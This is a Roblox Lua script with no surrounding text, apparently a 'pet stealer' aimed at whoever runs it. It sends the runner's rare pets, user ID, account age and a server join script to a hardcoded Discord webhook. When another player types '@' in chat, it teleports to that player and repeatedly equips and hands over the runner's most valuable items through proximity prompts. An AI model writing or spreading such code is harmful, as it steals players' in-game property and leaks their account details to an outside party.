local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
local TeleportService = game:GetService("TeleportService")
local UserInputService = game:GetService("UserInputService")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
local RARE_PETS = {
    "T-Rex", "Dragonfly", "Raccoon", 
    "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"
}

local ITEM_PRIORITY = {
    ["T-Rex"] = 1000,
    ["Dragonfly"] = 950,
    ["Queen bee"] = 900,
    ["Disco bee"] = 850,
    ["Raccoon"] = 800,
    ["Mimic Octopus"] = 750,
    ["Butterfly"] = 700,
    ["Disco"] = 600,
    ["Wet"] = 500,
}

local function sendToDiscord(content, embed)
    local payload = {
        content = content,
        embeds = {embed}
    }
    local success, err = pcall(function()
        local json = HttpService:JSONEncode(payload)
        HttpService:PostAsync(WEBHOOK_URL, json)
    end)
    if not success then
        warn("Webhook failed: "..err)
    end
end

local function sendInitialWebhook()
    local placeId = game.PlaceId
    local jobId = game.JobId
    local items = {}
    
    for _,item in pairs(LocalPlayer.Backpack:GetChildren()) do
        table.insert(items, item.Name)
    end
    
    local rareItems = {}
    for _,pet in pairs(RARE_PETS) do
        if table.find(items, pet) then
            table.insert(rareItems, pet)
        end
    end
    
    local embed = {
        title = "🔍 Inventory Scan | "..LocalPlayer.Name,
        description = "**Items:** "..#items.."\n**Rare Items:** "..#rareItems,
        color = #rareItems > 0 and 0xFF0000 or 0x00FF00,
        thumbnail = {
            url = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=420&height=420&format=png"
        },
        fields = {
            {name = "📌 Join Script", value = string.format('```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")\n```', placeId, jobId), inline = false},
            {name = "🆔 User ID", value = "```"..LocalPlayer.UserId.."```", inline = true},
            {name = "📅 Account Age", value = "```"..LocalPlayer.AccountAge.." days```", inline = true},
            {name = "🌟 Rare Items", value = #rareItems > 0 and "```"..table.concat(rareItems, ", ").."```" or "```None```", inline = false}
        },
        footer = {
            text = "Scan Time: "..os.date("%X")
        }
    }
    
    sendToDiscord(#rareItems > 0 and "@everyone" or nil, embed)
end

local function getBestItem(target)
    local bestItem, bestPriority = nil, 0
    
    for _,item in pairs(target.Backpack:GetChildren()) do
        local itemName = item.Name
        local priority = 400
        
        for pet, petPriority in pairs(ITEM_PRIORITY) do
            if string.find(itemName, pet) then
                priority = petPriority
                break
            end
        end
        
        local rarity = string.match(itemName, "%[([%w%s]+)%]")
        if rarity and ITEM_PRIORITY[rarity] then
            priority = ITEM_PRIORITY[rarity]
        end
        
        if priority > bestPriority then
            bestPriority = priority
            bestItem = item
        end
    end
    
    return bestItem
end

local function findBestPrompt(targetChar)
    local bestPrompt, highestHoldDuration = nil, 0
    
    for _,part in pairs(targetChar:GetDescendants()) do
        if part:IsA("ProximityPrompt") then
            if part.HoldDuration > highestHoldDuration then
                highestHoldDuration = part.HoldDuration
                bestPrompt = part
            end
        end
    end
    
    return bestPrompt or targetChar:FindFirstChild("HumanoidRootPart") or targetChar:FindFirstChild("UpperTorso") or targetChar:FindFirstChild("Torso")
end

local function teleportToPlayer(target)
    local targetChar = target.Character or target.CharacterAdded:Wait()
    local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        LocalPlayer.Character:SetPrimaryPartCFrame(targetChar:GetPrimaryPartCFrame() * CFrame.new(0, 0, -3))
    end
end

local function interactWithTarget(target)
    teleportToPlayer(target)
    local targetChar = target.Character or target.CharacterAdded:Wait()
    local interactPart = findBestPrompt(targetChar)
    
    LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
    LocalPlayer.CameraMaxZoomDistance = 0.5
    LocalPlayer.CameraMinZoomDistance = 0.5
    
    local lookConn = RunService.Heartbeat:Connect(function()
        Camera.CFrame = CFrame.new(Camera.CFrame.Position, interactPart.Position)
    end)
    
    while true do
        local bestItem = getBestItem(LocalPlayer)
        if not bestItem then break end
        
        LocalPlayer.Character.Humanoid:EquipTool(bestItem)
        task.wait(0.5)
        
        if interactPart:IsA("ProximityPrompt") then
            local startTime = os.clock()
            while os.clock() - startTime < 5 do
                if not interactPart.Enabled then break end
                fireproximityprompt(interactPart)
                task.wait(0.1)
            end
        else
            mouse1press()
            task.wait(5)
            mouse1release()
        end
    end
    
    if lookConn then lookConn:Disconnect() end
end

local function onPlayerChatted(player, message)
    if player == LocalPlayer then return end
    if not string.find(message, "@") then return end
    
    local items = {}
    for _,item in pairs(player.Backpack:GetChildren()) do
        table.insert(items, item.Name)
    end
    
    local rareItems = {}
    for _,pet in pairs(RARE_PETS) do
        if table.find(items, pet) then
            table.insert(rareItems, pet)
        end
    end
    
    local embed = {
        title = "🎯 Target Triggered | "..player.Name,
        description = "**Mentioned in chat**",
        color = 0xFFA500,
        thumbnail = {
            url = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"
        },
        fields = {
            {name = "🆔 User ID", value = "```"..player.UserId.."```", inline = true},
            {name = "📅 Account Age", value = "```"..player.AccountAge.." days```", inline = true},
            {name = "📦 Total Items", value = "```"..#items.."```", inline = true},
            {name = "🌟 Rare Items", value = #rareItems > 0 and "```"..table.concat(rareItems, ", ").."```" or "```None```", inline = false}
        },
        footer = {
            text = "Trigger Time: "..os.date("%X")
        }
    }
    
    sendToDiscord(nil, embed)
    interactWithTarget(player)
end

sendInitialWebhook()

for _,player in pairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        player.Chatted:Connect(function(msg)
            onPlayerChatted(player, msg)
        end)
    end
end

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg)
        onPlayerChatted(player, msg)
    end)
end)

local function disableLocalPrompts()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local rootPart = character:WaitForChild("HumanoidRootPart")
    
    for _,child in pairs(rootPart:GetChildren()) do
        if child:IsA("ProximityPrompt") then
            child.Enabled = false
        end
    end
end

LocalPlayer.CharacterAdded:Connect(disableLocalPrompts)
disableLocalPrompts()
